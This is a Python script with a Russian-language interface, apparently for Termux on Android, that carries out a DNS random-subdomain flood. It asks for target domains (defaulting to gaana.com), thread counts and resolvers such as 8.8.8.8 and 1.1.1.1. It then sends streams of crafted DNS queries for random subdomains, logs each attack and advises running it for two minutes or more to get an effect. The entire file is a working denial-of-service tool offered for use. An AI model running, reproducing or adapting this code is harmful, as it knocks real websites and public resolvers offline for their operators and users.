#!/data/data/com.termux/files/usr/bin/python3
import socket
import random
import time
import threading
import sys
import os

class AdvancedDNSFlooder:
    def __init__(self):
        self.running = True
        self.count = 0
        self.errors = 0
        self.start_time = time.time()
        self.log_file = "/data/data/com.termux/files/home/dns_attack.log"
        
        # Получаем данные от пользователя
        self.get_targets()
        self.get_parameters()
    
    def get_targets(self):
        """Получение целей от пользователя"""
        print("╔══════════════════════════════════════════════╗")
        print("║       DNS FLOODER - ВЫБОР ЦЕЛЕЙ              ║")
        print("╚══════════════════════════════════════════════╝")
        print("")
        
        self.targets = []
        
        while True:
            url = input("Введите URL (например: gaana.com или site.com): ").strip()
            
            if not url:
                print("[!] URL не может быть пустым!")
                continue
            
            # Убираем протокол если есть
            url = url.replace("http://", "").replace("https://", "").replace("www.", "")
            
            # Убираем путь если есть
            url = url.split('/')[0]
            
            # Проверяем формат
            if '.' not in url or len(url) < 4:
                print(f"[!] Некорректный URL: {url}")
                continue
            
            self.targets.append(url)
            print(f"[+] Цель добавлена: {url}")
            
            more = input("Добавить ещё цель? (y/n): ").strip().lower()
            if more != 'y':
                break
        
        if not self.targets:
            print("[!] Не указаны цели, использую по умолчанию")
            self.targets = ["gaana.com"]
    
    def get_parameters(self):
        """Получение параметров атаки"""
        print("\n════════════════════════════════════════════════")
        print("НАСТРОЙКА ПАРАМЕТРОВ АТАКИ")
        
        # Длительность
        while True:
            try:
                duration = input("Длительность атаки в секундах (0=бесконечно): ").strip()
                self.duration = 0 if duration == "0" else int(duration)
                if self.duration < 0:
                    print("[!] Длительность не может быть отрицательной")
                    continue
                break
            except:
                print("[!] Введите число")
        
        # Интенсивность
        while True:
            try:
                threads = input("Количество потоков (1-100, по умолчанию 10): ").strip()
                self.threads = 10 if not threads else int(threads)
                if not 1 <= self.threads <= 100:
                    print("[!] Должно быть от 1 до 100")
                    continue
                break
            except:
                print("[!] Введите число")
        
        # DNS серверы
        print("\nВыбор DNS серверов:")
        print("1. Comnet (192.168.1.1)")
        print("2. Google DNS (8.8.8.8)")
        print("3. Cloudflare (1.1.1.1)")
        print("4. Uztelecom (192.168.100.1)")
        print("5. Все выше")
        print("6. Указать свои")
        
        choice = input("Ваш выбор (1-5): ").strip()
        
        if choice == "1":
            self.dns_servers = ["192.168.1.1"]
        elif choice == "2":
            self.dns_servers = ["8.8.8.8"]
        elif choice == "4":
          self.dns_servers = ["192.168.100.1"]
        elif choice == "3":
            self.dns_servers = ["1.1.1.1"]
        elif choice == "5":
            self.dns_servers = ["192.168.1.1", "8.8.8.8", "1.1.1.1","192.168.100.1"]
        elif choice == "6":
            custom = input("Введите DNS серверы через запятую: ").strip()
            self.dns_servers = [s.strip() for s in custom.split(',') if s.strip()]
        else:
            self.dns_servers = ["192.168.1.1", "8.8.8.8", "1.1.1.1"]
    
    def create_dns_query(self, domain):
        """Создание DNS запроса"""
        # Случайный поддомен
        levels = random.randint(2, 4)
        subdomain = ""
        for _ in range(levels):
            length = random.randint(5, 15)
            chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
            segment = ''.join(random.choices(chars, k=length))
            subdomain = f"{segment}.{subdomain}" if subdomain else segment
        
        full_domain = f"{subdomain}.{domain}"
        
        # Создание DNS пакета
        query = bytearray()
        
        # DNS Header
        query.extend([random.randint(0, 255), random.randint(0, 255)])  # ID
        query.extend(b'\x01\x00')  # Flags
        query.extend(b'\x00\x01')  # Questions
        query.extend(b'\x00\x00')  # Answer RRs
        query.extend(b'\x00\x00')  # Authority RRs
        query.extend(b'\x00\x00')  # Additional RRs
        
        # Domain Name
        for part in full_domain.split('.'):
            query.append(len(part))
            query.extend(part.encode('utf-8'))
        query.append(0)  # End of domain
        
        # Query Type (A) and Class (IN)
        query.extend(b'\x00\x01')  # Type A
        query.extend(b'\x00\x01')  # Class IN
        
        return bytes(query), full_domain
    
    def attack_thread(self, server, thread_id):
        """Поток атаки на DNS сервер"""
        thread_count = 0
        
        while self.running:
            # Проверка времени если установлена длительность
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.3)
                
                # Для каждой цели
                for target in self.targets:
                    query, domain = self.create_dns_query(target)
                    
                    # Отправка запроса
                    sock.sendto(query, (server, 53))
                    thread_count += 1
                    self.count += 1
                    
                    # Вывод статистики
                    if self.count % 100 == 0:
                        elapsed = time.time() - self.start_time
                        speed = self.count / elapsed if elapsed > 0 else 0
                        sys.stdout.write(f"\r[*] Запросов: {self.count} | Скорость: {speed:.1f}/сек | Активные цели: {len(self.targets)}")
                        sys.stdout.flush()
                    
                    # Случайная задержка для регулировки нагрузки
                    time.sleep(random.uniform(0.005, 0.02))
                
                sock.close()
                
            except Exception as e:
                self.errors += 1
                if self.errors % 50 == 0:
                    print(f"\n[!] Ошибок: {self.errors} (продолжаем работу)")
                time.sleep(0.1)
    
    def monitor_progress(self):
        """Мониторинг прогресса"""
        print("\n" + "═" * 60)
        print("СТАТУС АТАКИ:")
        
        while self.running:
            elapsed = time.time() - self.start_time
            
            # Если установлено время и оно вышло
            if self.duration > 0 and elapsed >= self.duration:
                print("\n[!] Время вышло, завершение...")
                self.running = False
                break
            
            # Каждые 5 секунд выводим детальный статус
            if int(elapsed) % 5 == 0:
                speed = self.count / elapsed if elapsed > 0 else 0
                remaining = self.duration - elapsed if self.duration > 0 else float('inf')
                
                print(f"\n   Время: {elapsed:.1f}с | Запросов: {self.count} | "
                      f"Скорость: {speed:.1f}/сек | Ошибок: {self.errors}")
                
                if self.duration > 0:
                    print(f"   Осталось: {remaining:.1f}с | "
                          f"Прогресс: {(elapsed/self.duration)*100:.1f}%")
            
            time.sleep(1)
    
    def run(self):
        """Основной запуск"""
        print("\n" + "═" * 60)
        print("ПОДТВЕРЖДЕНИЕ АТАКИ:")
        print(f"   Цели: {', '.join(self.targets)}")
        print(f"   DNS серверы: {', '.join(self.dns_servers)}")
        print(f"   Потоки: {self.threads}")
        print(f"   Длительность: {self.duration if self.duration > 0 else 'бесконечно'}с")
        print("═" * 60)
        
        confirm = input("\nНачать атаку? (y/n): ").strip().lower()
        if confirm != 'y':
            print("[!] Атака отменена")
            return
        
        print("\n[+] Запуск атаки... (Ctrl+C для остановки)")
        print(f"[+] Мониторинг: tail -f {self.log_file}")
        print("-" * 60)
        
        # Логирование начала
        with open(self.log_file, "a") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Начало атаки: {time.ctime()}\n")
            f.write(f"Цели: {', '.join(self.targets)}\n")
            f.write(f"DNS серверы: {', '.join(self.dns_servers)}\n")
            f.write(f"Потоки: {self.threads}\n")
            f.write(f"{'='*50}\n")
        
        # Запуск потоков мониторинга
        monitor_thread = threading.Thread(target=self.monitor_progress, daemon=True)
        monitor_thread.start()
        
        # Запуск атакующих потоков
        attack_threads = []
        for i in range(self.threads):
            # Распределяем потоки по DNS серверам
            server = self.dns_servers[i % len(self.dns_servers)]
            thread = threading.Thread(target=self.attack_thread, args=(server, i+1))
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
            time.sleep(0.05)  # Небольшая задержка между запуском
        
        # Ожидание завершения или прерывания
        try:
            # Если установлено время, ждём его
            if self.duration > 0:
                time.sleep(self.duration)
                self.running = False
            else:
                # Бесконечный цикл
                while self.running:
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print("\n\n[!] Получен сигнал остановки (Ctrl+C)")
            self.running = False
        
        # Ожидание завершения потоков
        for thread in attack_threads:
            thread.join(timeout=2)
        
        # Финальный отчёт
        self.generate_report()
    
    def generate_report(self):
        """Генерация финального отчёта"""
        elapsed = time.time() - self.start_time
        
        print("\n" + "═" * 60)
        print("ФИНАЛЬНЫЙ ОТЧЁТ")
        print("═" * 60)
        print(f"   Цели атаки: {', '.join(self.targets)}")
        print(f"   DNS серверы: {', '.join(self.dns_servers)}")
        print(f"   Потоки: {self.threads}")
        print(f"   Общее время: {elapsed:.1f} секунд")
        print(f"   Всего запросов: {self.count}")
        print(f"   Ошибок: {self.errors}")
        
        if elapsed > 0:
            print(f"   Средняя скорость: {self.count/elapsed:.1f} запросов/сек")
            print(f"   Примерная нагрузка: {(self.count/elapsed)*60:.0f} запросов/мин")
        
        # Рекомендации
        print("\n" + "─" * 60)
        print("РЕКОМЕНДАЦИИ:")
        
        if self.count > 1000:
            print("   ✓ Высокая нагрузка достигнута")
            print("   ✓ Для эффекта рекомендуемая длительность: 2-3 минуты")
        else:
            print("   ⚠ Низкая нагрузка, увеличьте количество потоков или время")
        
        print(f"   📊 Подробный лог: {self.log_file}")
        print("   ⏰ Для следующей атаки увеличьте время до 120+ секунд")
        print("═" * 60)

# Запуск
if __name__ == "__main__":
    print("Загрузка DNS Flooder...")
    try:
        flooder = AdvancedDNSFlooder()
        flooder.run()
    except KeyboardInterrupt:
        print("\n[!] Программа прервана пользователем")
    except Exception as e:
        print(f"\n[!] Критическая ошибка: {e}")
        print("Попробуйте запустить снова")
